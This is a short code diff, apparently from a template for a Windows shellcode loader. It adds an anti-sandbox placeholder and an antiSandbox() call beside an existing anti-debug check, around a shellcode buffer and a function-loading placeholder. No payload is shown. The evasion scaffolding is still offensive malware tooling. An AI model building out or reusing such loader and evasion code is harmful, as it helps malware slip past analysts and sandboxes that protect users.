@@ -16,6 +16,8 @@ unsigned int shellcode_len = sizeof(shellcode);
 
 <ANTI_DEBUG>
 
+<ANTI_SANDBOX>
+
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
@@ -31,6 +33,9 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     // Anti debug check
     antiDebug();
+
+    // Anti sandbox check
+    antiSandbox();
 
     <LOAD_FUNCTIONS>
 
